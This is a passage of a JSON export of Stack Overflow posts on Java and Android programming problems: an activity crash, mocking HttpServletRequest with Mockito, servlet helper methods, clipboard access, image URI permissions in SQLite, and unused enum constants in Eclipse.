{\ncompileSdkVersion 30\nbuildToolsVersion &quot;30.0.3&quot;\n\ndefaultConfig {\n    applicationId &quot;com.ishita.snapchatfilter&quot;\n    minSdkVersion 28\n    targetSdkVersion 30\n    versionCode 1\n    versionName &quot;1.0&quot;\n\n    testInstrumentationRunner &quot;androidx.test.runner.AndroidJUnitRunner&quot;\n}\n\nbuildTypes {\n    release {\n        minifyEnabled false\n        proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'\n    }\n}\ncompileOptions {\n    sourceCompatibility JavaVersion.VERSION_1_8\n    targetCompatibility JavaVersion.VERSION_1_8\n}}\n\n\n\n\ndependencies {\n    implementation 'androidx.appcompat:appcompat:1.3.1'\nimplementation 'com.google.android.material:material:1.4.0'\nimplementation 'androidx.constraintlayout:constraintlayout:2.1.0'\ntestImplementation 'junit:junit:4.+'\nandroidTestImplementation 'androidx.test.ext:junit:1.1.3'\nandroidTestImplementation 'androidx.test.espresso:espresso-core:3.4.0'\n\nimplementation 'com.google.firebase:firebase-bom:29.0.3'\nimplementation 'com.google.firebase:firebase-auth'\nimplementation 'com.google.firebase:firebase-auth:18.0.0'\nimplementation 'com.google.firebase:firebase-database:18.0.0'\n</code></pre>\n<p>}</p>\n<p><strong>ERROR I GET:</strong></p>\n<pre><code>    E/AndroidRuntime: FATAL EXCEPTION: main\n    Process: com.ishita.snapchatfilter, PID: 29152\n    java.lang.RuntimeException: Unable to start activity \n     \n   ComponentInfo{com.ishita.snapchatfilter/com.ishita.snapchatfilter.RegistrationActivity}: java.lang.NullPointerException: Attempt to invoke virtual method 'void android.widget.Button.setOnClickListener(android.view.View$OnClickListener)' on a null object reference\n        at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:3797)\n        at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:3973)\n        at android.app.servertransaction.LaunchActivityItem.execute(LaunchActivityItem.java:85)\n        at android.app.servertransaction.TransactionExecutor.executeCallbacks(TransactionExecutor.java:135)\n        at android.app.servertransaction.TransactionExecutor.execute(TransactionExecutor.java:95)\n        at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2307)\n        at android.os.Handler.dispatchMessage(Handler.java:106)\n        at android.os.Looper.loop(Looper.java:246)\n        at android.app.ActivityThread.main(ActivityThread.java:8528)\n        at java.lang.reflect.Method.invoke(Native Method)\n        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:602)\n        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1130)\n     Caused by: java.lang.NullPointerException: Attempt to invoke virtual method 'void android.widget.Button.setOnClickListener(android.view.View$OnClickListener)' on a null object reference\n        at com.ishita.snapchatfilter.RegistrationActivity.onCreate(RegistrationActivity.java:58)\n        at android.app.Activity.performCreate(Activity.java:8207)\n        at android.app.Activity.performCreate(Activity.java:8191)\n        at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1309)\n        at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:3770)\n        at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:3973)\n        at android.app.servertransaction.LaunchActivityItem.execute(LaunchActivityItem.java:85)\n        at android.app.servertransaction.TransactionExecutor.executeCallbacks(TransactionExecutor.java:135)\n        at android.app.servertransaction.TransactionExecutor.execute(TransactionExecutor.java:95)\n        at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2307)\n        at android.os.Handler.dispatchMessage(Handler.java:106)\n        at android.os.Looper.loop(Looper.java:246)\n        at android.app.ActivityThread.main(ActivityThread.java:8528)\n        at java.lang.reflect.Method.invoke(Native Method)\n        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:602)\n        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1130)\nI/Process: Sending signal. PID: 29152 SIG: 9\n</code></pre>\n"},{"tags":["java","unit-testing","mockito","junit4"],"comments":[{"owner":{"account_id":2818342,"reputation":299856,"user_id":2422776,"display_name":"Mureinik"},"score":0,"creation_date":1396013698,"post_id":22714359,"comment_id":34613432,"body_markdown":"Can you show your mocking attempt?","body":"Can you show your mocking attempt?"},{"owner":{"account_id":2176261,"reputation":580,"user_id":1926895,"accept_rate":64,"display_name":"Vivek"},"score":0,"creation_date":1396014645,"post_id":22714359,"comment_id":34614116,"body_markdown":"i changed post again . see insertSumIntoDB(request.getAttribute(&quot;sum&quot;)) this is actually insertSumintoDb(null) , cuz i haven&#39;t given behaviour for request.getAttribute(&quot;sum&quot;);","body":"i changed post again . see insertSumIntoDB(request.getAttribute(&quot;sum&quot;)) this is actually insertSumintoDb(null) , cuz i haven&#39;t given behaviour for request.getAttribute(&quot;sum&quot;);"}],"answers":[{"tags":[],"owner":{"account_id":323343,"reputation":1410,"user_id":643302,"accept_rate":100,"display_name":"Thomas"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1640269992,"creation_date":1396014249,"answer_id":22714581,"question_id":22714359,"body_markdown":"Mockito supports real partial mocks: [Real partial mocks (Since 1.8.0)](https://javadoc.io/doc/org.mockito/mockito-core/latest/org/mockito/Mockito.html#16)\r\n\r\nI think it fits your needs","title":"How to partially mock HttpServletRequest using Mockito","body":"<p>Mockito supports real partial mocks: <a href=\"https://javadoc.io/doc/org.mockito/mockito-core/latest/org/mockito/Mockito.html#16\" rel=\"nofollow noreferrer\">Real partial mocks (Since 1.8.0)</a></p>\n<p>I think it fits your needs</p>\n"},{"tags":[],"owner":{"account_id":1361840,"reputation":1104,"user_id":1299049,"accept_rate":100,"display_name":"m c"},"down_vote_count":2,"up_vote_count":20,"is_accepted":false,"score":18,"last_activity_date":1452781821,"creation_date":1432120440,"answer_id":30348029,"question_id":22714359,"body_markdown":"Spring&#39;s [MockHttpServletRequest][1] and [MockHttpServletResponse][2] are useful for that purpose. E.g.\r\n\r\n        MockHttpServletRequest request = new MockHttpServletRequest();\r\n        MockHttpServletResponse response = new MockHttpServletResponse();\r\n        request.addHeader(HttpHeaders.HOST, &quot;myhost.com&quot;);\r\n        request.setLocalPort(PORT_VALID); // e.g. 8081\r\n        request.setRemoteAddr(REQUEST_IP); // e.g. 127.0.0.1\r\nthen I can call *myclass.method(request, response, ...)* and check whether some attribute has been correctly set into the request, e.g.\r\n\r\n        MyBean attr = (MyBean) request.getAttribute(ATTRIBUTE_NAME));\r\n        // do my Assert.* stuff with &#39;attr&#39;\r\n\r\nMockHttpServletRequest and MockHttpServletResponse work fine where *mock(HttpServletRequest.class)* fails, for instance where you need to get back the real content of a request attribute which has been previously set within your business logic.\r\n\r\n\r\n  [1]: http://docs.spring.io/spring/docs/current/javadoc-api/index.html?org/springframework/mock/web/MockHttpServletRequest.html\r\n  [2]: http://docs.spring.io/spring/docs/current/javadoc-api/index.html?org/springframework/mock/web/MockHttpServletResponse.html","title":"How to partially mock HttpServletRequest using Mockito","body":"<p>Spring's <a href=\"http://docs.spring.io/spring/docs/current/javadoc-api/index.html?org/springframework/mock/web/MockHttpServletRequest.html\" rel=\"noreferrer\">MockHttpServletRequest</a> and <a href=\"http://docs.spring.io/spring/docs/current/javadoc-api/index.html?org/springframework/mock/web/MockHttpServletResponse.html\" rel=\"noreferrer\">MockHttpServletResponse</a> are useful for that purpose. E.g.</p>\n\n<pre><code>    MockHttpServletRequest request = new MockHttpServletRequest();\n    MockHttpServletResponse response = new MockHttpServletResponse();\n    request.addHeader(HttpHeaders.HOST, \"myhost.com\");\n    request.setLocalPort(PORT_VALID); // e.g. 8081\n    request.setRemoteAddr(REQUEST_IP); // e.g. 127.0.0.1\n</code></pre>\n\n<p>then I can call <em>myclass.method(request, response, ...)</em> and check whether some attribute has been correctly set into the request, e.g.</p>\n\n<pre><code>    MyBean attr = (MyBean) request.getAttribute(ATTRIBUTE_NAME));\n    // do my Assert.* stuff with 'attr'\n</code></pre>\n\n<p>MockHttpServletRequest and MockHttpServletResponse work fine where <em>mock(HttpServletRequest.class)</em> fails, for instance where you need to get back the real content of a request attribute which has been previously set within your business logic.</p>\n"},{"tags":[],"owner":{"account_id":1136625,"reputation":3087,"user_id":1121571,"accept_rate":61,"display_name":"Aure77"},"down_vote_count":0,"up_vote_count":8,"is_accepted":true,"score":8,"last_activity_date":1433836900,"creation_date":1433836900,"answer_id":30726246,"question_id":22714359,"body_markdown":"You need to store attributes into a collection :\r\n\r\n\t// Collection to store attributes keys/values\r\n\tfinal Map&lt;String, Object&gt; attributes = new ConcurrentHashMap&lt;String, Object&gt;();\t\t\r\n\r\n\t// Mock setAttribute\r\n\tMockito.doAnswer(new Answer&lt;Void&gt;() {\r\n\t\t@Override\r\n\t\tpublic Void answer(InvocationOnMock invocation) throws Throwable {\r\n\t\t\tString key = invocation.getArgumentAt(0, String.class);\r\n\t\t\tObject value = invocation.getArgumentAt(1, Object.class);\r\n\t\t\tattributes.put(key, value);\r\n\t\t\tSystem.out.println(&quot;put attribute key=&quot;+key+&quot;, value=&quot;+value);\r\n\t\t\treturn null;\r\n\t\t}\r\n\t}).when(request).setAttribute(Mockito.anyString(), Mockito.anyObject());\r\n\r\n\t// Mock getAttribute\r\n\tMockito.doAnswer(new Answer&lt;Object&gt;() {\r\n\t\t@Override\r\n\t\tpublic Object answer(InvocationOnMock invocation) throws Throwable {\r\n\t\t\tString key = invocation.getArgumentAt(0, String.class);\r\n\t\t\tObject value = attributes.get(key);\r\n\t\t\tSystem.out.println(&quot;get attribute value for key=&quot;+key+&quot; : &quot;+value);\r\n\t\t\treturn value;\r\n\t\t}\r\n\t}).when(request).getAttribute(Mockito.anyString());","title":"How to partially mock HttpServletRequest using Mockito","body":"<p>You need to store attributes into a collection :</p>\n\n<pre><code>// Collection to store attributes keys/values\nfinal Map&lt;String, Object&gt; attributes = new ConcurrentHashMap&lt;String, Object&gt;();     \n\n// Mock setAttribute\nMockito.doAnswer(new Answer&lt;Void&gt;() {\n    @Override\n    public Void answer(InvocationOnMock invocation) throws Throwable {\n        String key = invocation.getArgumentAt(0, String.class);\n        Object value = invocation.getArgumentAt(1, Object.class);\n        attributes.put(key, value);\n        System.out.println(\"put attribute key=\"+key+\", value=\"+value);\n        return null;\n    }\n}).when(request).setAttribute(Mockito.anyString(), Mockito.anyObject());\n\n// Mock getAttribute\nMockito.doAnswer(new Answer&lt;Object&gt;() {\n    @Override\n    public Object answer(InvocationOnMock invocation) throws Throwable {\n        String key = invocation.getArgumentAt(0, String.class);\n        Object value = attributes.get(key);\n        System.out.println(\"get attribute value for key=\"+key+\" : \"+value);\n        return value;\n    }\n}).when(request).getAttribute(Mockito.anyString());\n</code></pre>\n"}],"owner":{"account_id":2176261,"reputation":580,"user_id":1926895,"accept_rate":64,"display_name":"Vivek"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":47137,"favorite_count":0,"down_vote_count":0,"up_vote_count":11,"accepted_answer_id":30726246,"answer_count":3,"score":11,"last_activity_date":1640269992,"creation_date":1396013596,"question_id":22714359,"body_markdown":"i am mocking a HttpServletRequest , in servlet call there are new values getting set in request because using same request we are dispaching request to some jsp so request object is used as a input object to servlet as well as output for next page.\r\n\r\ni mocked all input parameters , but for all request.setAttribute() , my code is doing nothing as it&#39;s a mocked class , say if i have \r\n\r\n    request.setAttribute(a,&quot;10&quot;)\r\n    System.out.println(&quot;a = &quot; + request.getAttribute(&quot;a&quot;));\r\n\r\ni get null cuz i haven&#39;t given any behavious for Request.getAttribute(&quot;a&quot;) , and i can&#39;t , it&#39;s my response for next page , so that explain i need 2 behaviour my request object thus partial mocking , and i am unable to spy or do any partial mocking on it so far.  any ideas?\r\n\r\nCode : \r\n     \r\n     //Testcase\r\n       Myservlet.java\r\n    public void doPost(request,response)\r\n        {\r\n             String a = request.getAttribute(&quot;a&quot;);\r\n             String b = request.getAttribute(&quot;b&quot;);\r\n             int sum = Integer.parseInt(a) + Integer.parseInt(b);\r\n             request.setAttribute(&quot;sum&quot;,sum);\r\n             //well in this example i can use sum what i calculated but in real senario i can&#39;t , i have to use request.getAttribute(&quot;sum&quot;)\r\n             insertSumIntoDB(request.getAttribute(&quot;sum&quot;));\r\n        }\r\n        }\r\n\r\n\r\n\r\n      //testMyservlet.java\r\n       @test\r\n    public void testServlet()\r\n     {\r\n     HttpServletRequest request = mock(HttpServletRequest.class);\r\n         HttpServletResponse response = mock(HttpServletResponse.class);\r\n    when(request.getAttribute(a)).thenReturn(&quot;10&quot;);\r\n    when(request.getAttribute(b)).thenReturn(&quot;20&quot;);\r\n    new Myservlet(request,response);\r\n    }","title":"How to partially mock HttpServletRequest using Mockito","body":"<p>i am mocking a HttpServletRequest , in servlet call there are new values getting set in request because using same request we are dispaching request to some jsp so request object is used as a input object to servlet as well as output for next page.</p>\n\n<p>i mocked all input parameters , but for all request.setAttribute() , my code is doing nothing as it's a mocked class , say if i have </p>\n\n<pre><code>request.setAttribute(a,\"10\")\nSystem.out.println(\"a = \" + request.getAttribute(\"a\"));\n</code></pre>\n\n<p>i get null cuz i haven't given any behavious for Request.getAttribute(\"a\") , and i can't , it's my response for next page , so that explain i need 2 behaviour my request object thus partial mocking , and i am unable to spy or do any partial mocking on it so far.  any ideas?</p>\n\n<p>Code : </p>\n\n<pre><code> //Testcase\n   Myservlet.java\npublic void doPost(request,response)\n    {\n         String a = request.getAttribute(\"a\");\n         String b = request.getAttribute(\"b\");\n         int sum = Integer.parseInt(a) + Integer.parseInt(b);\n         request.setAttribute(\"sum\",sum);\n         //well in this example i can use sum what i calculated but in real senario i can't , i have to use request.getAttribute(\"sum\")\n         insertSumIntoDB(request.getAttribute(\"sum\"));\n    }\n    }\n\n\n\n  //testMyservlet.java\n   @test\npublic void testServlet()\n {\n HttpServletRequest request = mock(HttpServletRequest.class);\n     HttpServletResponse response = mock(HttpServletResponse.class);\nwhen(request.getAttribute(a)).thenReturn(\"10\");\nwhen(request.getAttribute(b)).thenReturn(\"20\");\nnew Myservlet(request,response);\n}\n</code></pre>\n"},{"tags":["java","jsp","servlets","backend"],"comments":[{"owner":{"account_id":137890,"reputation":8718,"user_id":995052,"accept_rate":56,"display_name":"Kris"},"score":0,"creation_date":1640164625,"post_id":70446657,"comment_id":124528480,"body_markdown":"Learn a little about java packages, imports and method calls.  ??","body":"Learn a little about java packages, imports and method calls.  ??"},{"owner":{"account_id":22886030,"reputation":1849,"user_id":17026900,"display_name":"Oussama ZAGHDOUD"},"score":0,"creation_date":1640164704,"post_id":70446657,"comment_id":124528518,"body_markdown":"What do you mean by &quot;external function&quot; ? try to put your code to clarify the question","body":"What do you mean by &quot;external function&quot; ? try to put your code to clarify the question"}],"owner":{"account_id":21290364,"reputation":146,"user_id":15667462,"display_name":"Osama A. Abdelnasser"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":107,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1640269925,"creation_date":1640164375,"question_id":70446657,"body_markdown":"I am working on a web application using java and I need to use external function in the main servlet function, they are in the same file I don&#39;t know how. \r\nI will use the function multiple times so what should I do?\r\n\r\nfor example assume that my servlet is like this\r\nI want to execute say() inside main servlet function processRequest() and I tried this.say() and calling an object from servlet class\r\n\r\n    public void say(){\r\n            System.out.println(&quot;say called &lt;br&gt;&quot;);\r\n        }\r\n\r\n    protected void processRequest(HttpServletRequest request, HttpServletResponse response)\r\n            throws ServletException, IOException, ClassNotFoundException, SQLException {\r\n\r\n        response.setContentType(&quot;text/html;charset=UTF-8&quot;);\r\n        try (PrintWriter out = response.getWriter()) {\r\n            /* TODO output your page here. You may use following sample code. */\r\n            out.println(&quot;&lt;!DOCTYPE html&gt;&quot;);\r\n            out.println(&quot;&lt;html&gt;&quot;);\r\n            out.println(&quot;&lt;head&gt;&quot;);\r\n            out.println(&quot;&lt;title&gt;Inventory Control&lt;/title&gt;&quot;);            \r\n            out.println(&quot;&lt;/head&gt;&quot;);\r\n            out.println(&quot;&lt;body&gt;&quot;);\r\n            say();\r\n            this.say();\r\n            InventoryController inven =new InventoryController();\r\n            inven.say();\r\n            out.println(&quot;&lt;/body&gt;&quot;);\r\n            out.println(&quot;&lt;/html&gt;&quot;);\r\n        }\r\n    }","title":"how to use functions in the main servlet function","body":"<p>I am working on a web application using java and I need to use external function in the main servlet function, they are in the same file I don't know how.\nI will use the function multiple times so what should I do?</p>\n<p>for example assume that my servlet is like this\nI want to execute say() inside main servlet function processRequest() and I tried this.say() and calling an object from servlet class</p>\n<pre><code>public void say(){\n        System.out.println(&quot;say called &lt;br&gt;&quot;);\n    }\n\nprotected void processRequest(HttpServletRequest request, HttpServletResponse response)\n        throws ServletException, IOException, ClassNotFoundException, SQLException {\n\n    response.setContentType(&quot;text/html;charset=UTF-8&quot;);\n    try (PrintWriter out = response.getWriter()) {\n        /* TODO output your page here. You may use following sample code. */\n        out.println(&quot;&lt;!DOCTYPE html&gt;&quot;);\n        out.println(&quot;&lt;html&gt;&quot;);\n        out.println(&quot;&lt;head&gt;&quot;);\n        out.println(&quot;&lt;title&gt;Inventory Control&lt;/title&gt;&quot;);            \n        out.println(&quot;&lt;/head&gt;&quot;);\n        out.println(&quot;&lt;body&gt;&quot;);\n        say();\n        this.say();\n        InventoryController inven =new InventoryController();\n        inven.say();\n        out.println(&quot;&lt;/body&gt;&quot;);\n        out.println(&quot;&lt;/html&gt;&quot;);\n    }\n}\n</code></pre>\n"},{"tags":["java","android","xml","kotlin"],"answers":[{"tags":[],"owner":{"account_id":19182934,"reputation":74,"user_id":14014255,"display_name":"Bao Dinh"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1640269902,"creation_date":1640269902,"answer_id":70463505,"question_id":70462754,"body_markdown":"Since on android 10 or higher, u cant access to clipboard otherwise its will return null","title":"Clipboard does not work and return null(Android/Java)","body":"<p>Since on android 10 or higher, u cant access to clipboard otherwise its will return null</p>\n"}],"owner":{"account_id":19182934,"reputation":74,"user_id":14014255,"display_name":"Bao Dinh"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":165,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"accepted_answer_id":70463505,"answer_count":1,"score":1,"last_activity_date":1640269902,"creation_date":1640265916,"question_id":70462754,"body_markdown":"Im making a program that everytime you click a button, it will show what text do you copy in the TextView \\\r\nBut it return null  when I call (ClipboardManager)getSystemService(CLIPBOARD_SERVICE); \\\r\nI already copy some available text (&quot;ABC&quot;) but its not work \\\r\n**I don&#39;t know if clipboard need any user permission? In my manifest I don&#39;t write anything about permission** \\\r\nPlease help me \\\r\n\r\nHere is my code:\r\n\r\n      ClipboardManager clipBoard = (ClipboardManager)getSystemService(CLIPBOARD_SERVICE);\r\n\r\n    Button predictButton = (Button) mFloatingView.findViewById(R.id.predict);\r\n    predictButton.setOnClickListener(new View.OnClickListener() {\r\n        @Override\r\n        public void onClick(View v) {\r\n            Log.i(&quot;CLICK&quot;,&quot;work&quot;);\r\n            if (clipBoard != null &amp;&amp; clipBoard.getPrimaryClip() != null &amp;&amp; clipBoard.getPrimaryClip().getItemCount() &gt; 0) {\r\n                Log.i(&quot;CLIPBOARD&quot;,&quot;work&quot;);\r\n                ClipData clipData = clipBoard.getPrimaryClip();\r\n                ClipData.Item item = clipData.getItemAt(0);\r\n                String text = item.getText().toString();\r\n\r\n                final TextView textViewToChange = (TextView) mFloatingView.findViewById(R.id.predict_text);\r\n                textViewToChange.setText(text);\r\n            }\r\n        }\r\n    });\r\n\r\nAnd here is my log:\r\n\r\n    I/ViewRootImpl@748418f[]: ViewPostIme pointer 1\r\n    I/CLICK: work\r\n    I/ViewRootImpl@748418f[]: ViewPostIme pointer 0\r\n    I/ViewRootImpl@748418f[]: ViewPostIme pointer 1\r\n    I/CLICK: work","title":"Clipboard does not work and return null(Android/Java)","body":"<p>Im making a program that everytime you click a button, it will show what text do you copy in the TextView <br />\nBut it return null  when I call (ClipboardManager)getSystemService(CLIPBOARD_SERVICE); <br />\nI already copy some available text (&quot;ABC&quot;) but its not work <br />\n<strong>I don't know if clipboard need any user permission? In my manifest I don't write anything about permission</strong> <br />\nPlease help me \\</p>\n<p>Here is my code:</p>\n<pre><code>  ClipboardManager clipBoard = (ClipboardManager)getSystemService(CLIPBOARD_SERVICE);\n\nButton predictButton = (Button) mFloatingView.findViewById(R.id.predict);\npredictButton.setOnClickListener(new View.OnClickListener() {\n    @Override\n    public void onClick(View v) {\n        Log.i(&quot;CLICK&quot;,&quot;work&quot;);\n        if (clipBoard != null &amp;&amp; clipBoard.getPrimaryClip() != null &amp;&amp; clipBoard.getPrimaryClip().getItemCount() &gt; 0) {\n            Log.i(&quot;CLIPBOARD&quot;,&quot;work&quot;);\n            ClipData clipData = clipBoard.getPrimaryClip();\n            ClipData.Item item = clipData.getItemAt(0);\n            String text = item.getText().toString();\n\n            final TextView textViewToChange = (TextView) mFloatingView.findViewById(R.id.predict_text);\n            textViewToChange.setText(text);\n        }\n    }\n});\n</code></pre>\n<p>And here is my log:</p>\n<pre><code>I/ViewRootImpl@748418f[]: ViewPostIme pointer 1\nI/CLICK: work\nI/ViewRootImpl@748418f[]: ViewPostIme pointer 0\nI/ViewRootImpl@748418f[]: ViewPostIme pointer 1\nI/CLICK: work\n</code></pre>\n"},{"tags":["java","android","sqlite","android-studio","android-permissions"],"comments":[{"owner":{"account_id":39846,"reputation":991143,"user_id":115145,"accept_rate":84,"display_name":"CommonsWare"},"score":0,"creation_date":1640269233,"post_id":70463341,"comment_id":124558013,"body_markdown":"https://commonsware.com/blog/2020/08/08/uri-access-lifetime-still-shorter-than-you-might-think.html","body":"<a href=\"https://commonsware.com/blog/2020/08/08/uri-access-lifetime-still-shorter-than-you-might-think.html\" rel=\"nofollow noreferrer\">commonsware.com/blog/2020/08/08/&hellip;</a>"},{"owner":{"account_id":23016474,"reputation":162,"user_id":17138169,"display_name":"wafaa sisalem"},"score":0,"creation_date":1640271313,"post_id":70463341,"comment_id":124558769,"body_markdown":"Thank you so much I wasted my time on this problem and finally, now I know the solution. Thank you again.","body":"Thank you so much I wasted my time on this problem and finally, now I know the solution. Thank you again."}],"answers":[{"tags":[],"owner":{"account_id":19044113,"reputation":704,"user_id":13903584,"display_name":"Muhammad Asad"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1640269795,"creation_date":1640269795,"answer_id":70463481,"question_id":70463341,"body_markdown":"store image URI in sqlite is very bad idea. if the path is delete then your app does not retrieve the image. So if you want to store image in sqlite then convert your image in byte[] and store this byte[] in sqlite in a BLOB column. when you retrieve BOLB then convert byte[] to image and show into image view.\r\n\r\nif you don&#39;t understand how to store then see this link:\r\n\r\nhttps://abhiandroid.com/database/add-retrieve-image-sqlite-database-example-android-studio.html\r\n","title":"Get Image Uri from from SQLITE Android","body":"<p>store image URI in sqlite is very bad idea. if the path is delete then your app does not retrieve the image. So if you want to store image in sqlite then convert your image in byte[] and store this byte[] in sqlite in a BLOB column. when you retrieve BOLB then convert byte[] to image and show into image view.</p>\n<p>if you don't understand how to store then see this link:</p>\n<p><a href=\"https://abhiandroid.com/database/add-retrieve-image-sqlite-database-example-android-studio.html\" rel=\"nofollow noreferrer\">https://abhiandroid.com/database/add-retrieve-image-sqlite-database-example-android-studio.html</a></p>\n"}],"owner":{"account_id":23016474,"reputation":162,"user_id":17138169,"display_name":"wafaa sisalem"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":514,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":1,"score":1,"last_activity_date":1640269795,"creation_date":1640269026,"question_id":70463341,"body_markdown":"I have a problem with displaying the photo by getting the URI from SQLite.\r\nI picked up an image from gallery using these lines:\r\n\r\n     Intent intent = new Intent();\r\n        intent.setType(&quot;image/*&quot;);\r\n        intent.setAction(Intent.ACTION_GET_CONTENT);\r\n        someActivityResultLauncher.launch(intent);\r\n\r\nthen I received the intent like this in `onActivityResult`:\r\n\r\n     Intent data = result.getData();\r\n     imageUri = data.getData();\r\n     circleImageView.setImageURI(imageUri);\r\n\r\nThe image is displayed well in ImageView and there is no problem. But when I stored it in SQLite as String using toString method like this: `imageUri.toString()`.\r\nI got this string from SQLite then parsed it to URI again and tried to display it with imageView put this problem appeared:\r\n\r\n    Permission Denial: opening provider com.miui.gallery.provider.GalleryOpenProvider from ProcessRecord{35f7837 4773:com.example.booklibrary/u0a538} (pid=4773, uid=10538) that is not exported from UID 10096\r\n\r\nwhat is the problem here, and why I could display the image before storing it and could not display it again after getting it from SQLite! ","title":"Get Image Uri from from SQLITE Android","body":"<p>I have a problem with displaying the photo by getting the URI from SQLite.\nI picked up an image from gallery using these lines:</p>\n<pre><code> Intent intent = new Intent();\n    intent.setType(&quot;image/*&quot;);\n    intent.setAction(Intent.ACTION_GET_CONTENT);\n    someActivityResultLauncher.launch(intent);\n</code></pre>\n<p>then I received the intent like this in <code>onActivityResult</code>:</p>\n<pre><code> Intent data = result.getData();\n imageUri = data.getData();\n circleImageView.setImageURI(imageUri);\n</code></pre>\n<p>The image is displayed well in ImageView and there is no problem. But when I stored it in SQLite as String using toString method like this: <code>imageUri.toString()</code>.\nI got this string from SQLite then parsed it to URI again and tried to display it with imageView put this problem appeared:</p>\n<pre><code>Permission Denial: opening provider com.miui.gallery.provider.GalleryOpenProvider from ProcessRecord{35f7837 4773:com.example.booklibrary/u0a538} (pid=4773, uid=10538) that is not exported from UID 10096\n</code></pre>\n<p>what is the problem here, and why I could display the image before storing it and could not display it again after getting it from SQLite!</p>\n"},{"tags":["java","eclipse","enums"],"comments":[{"owner":{"account_id":10263065,"reputation":2310,"user_id":7573818,"display_name":"Jeremy Grand"},"score":0,"creation_date":1492533673,"post_id":43477718,"comment_id":74010836,"body_markdown":"You can search manually for references (ctrl+shift+G) on every constant.","body":"You can search manually for references (ctrl+shift+G) on every constant."},{"owner":{"account_id":2497273,"reputation":483,"user_id":2173372,"accept_rate":14,"display_name":"user2173372"},"score":0,"creation_date":1492533807,"post_id":43477718,"comment_id":74010904,"body_markdown":"But I have many classes with many constants so it will be quite difficult to do on every field","body":"But I have many classes with many constants so it will be quite difficult to do on every field"},{"owner":{"account_id":10263065,"reputation":2310,"user_id":7573818,"display_name":"Jeremy Grand"},"score":0,"creation_date":1492534253,"post_id":43477718,"comment_id":74011220,"body_markdown":"I know, that why I didn&#39;t post that as an answer. I don&#39;t have any viable answer for that. Maybe using a code analyzer like Sonar ?","body":"I know, that why I didn&#39;t post that as an answer. I don&#39;t have any viable answer for that. Maybe using a code analyzer like Sonar ?"},{"owner":{"account_id":10108456,"reputation":3914,"user_id":7470253,"display_name":"M. Prokhorov"},"score":0,"creation_date":1492534557,"post_id":43477718,"comment_id":74011389,"body_markdown":"Are you absolutely sure none of your clients depend on your enum values though? If that is the case, in addition to Jeremy suggestion, I can suggest to remove all values from enum, and then add them back until project compiles again.","body":"Are you absolutely sure none of your clients depend on your enum values though? If that is the case, in addition to Jeremy suggestion, I can suggest to remove all values from enum, and then add them back until project compiles again."},{"owner":{"account_id":2497273,"reputation":483,"user_id":2173372,"accept_rate":14,"display_name":"user2173372"},"score":0,"creation_date":1492534850,"post_id":43477718,"comment_id":74011574,"body_markdown":"Yes, but with many classes and constants it will be a very long process.","body":"Yes, but with many classes and constants it will be a very long process."},{"owner":{"account_id":204515,"reputation":11679,"user_id":452775,"accept_rate":63,"display_name":"Lii"},"score":0,"creation_date":1492592350,"post_id":43477718,"comment_id":74036745,"body_markdown":"It might be a little easier to do this manually using keyboard shortcuts. With the cursor at an enum constant declaration: Open call hierarchy view on that constant (Ctrl+Alt+H); activate editor again (I have bound Ctrl+E for this); navigate to next constant declaration (Ctrl+Shift+Down).","body":"It might be a little easier to do this manually using keyboard shortcuts. With the cursor at an enum constant declaration: Open call hierarchy view on that constant (Ctrl+Alt+H); activate editor again (I have bound Ctrl+E for this); navigate to next constant declaration (Ctrl+Shift+Down)."}],"answers":[{"tags":[],"owner":{"account_id":204515,"reputation":11679,"user_id":452775,"accept_rate":63,"display_name":"Lii"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1492537965,"creation_date":1492534467,"answer_id":43478007,"question_id":43477718,"body_markdown":"Eclipse doesn&#39;t do cross-file analysis like this by default, it only warns for unused fields in the same file.\r\n\r\nBut there are plug-ins that do cross-file analysis.\r\n\r\nThe [Unnecessary Code Detector][page] is such a plug-in.\r\n\r\nDisclaimer: I haven&#39;t used this tool myself, but it looks very promising. [The homepage says][enum] it can detect unused enum constants.\r\n\r\nScreen shot:\r\n\r\n[![Unnecessary Code Detector screen shot][1]][1]\r\n\r\n[page]: http://www.ucdetector.org/\r\n[enum]: http://www.ucdetector.org/reports/UCDetectorReport.html\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/eUES5.png","title":"Find unused constants in enum class automatically","body":"<p>Eclipse doesn't do cross-file analysis like this by default, it only warns for unused fields in the same file.</p>\n\n<p>But there are plug-ins that do cross-file analysis.</p>\n\n<p>The <a href=\"http://www.ucdetector.org/\" rel=\"nofollow noreferrer\">Unnecessary Code Detector</a> is such a plug-in.</p>\n\n<p>Disclaimer: I haven't used this tool myself, but it looks very promising. <a href=\"http://www.ucdetector.org/reports/UCDetectorReport.html\" rel=\"nofollow noreferrer\">The homepage says</a> it can detect unused enum constants.</p>\n\n<p>Screen shot:</p>\n\n<p><a href=\"https://i.stack.imgur.com/eUES5.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/eUES5.png\" alt=\"Unnecessary Code Detector screen 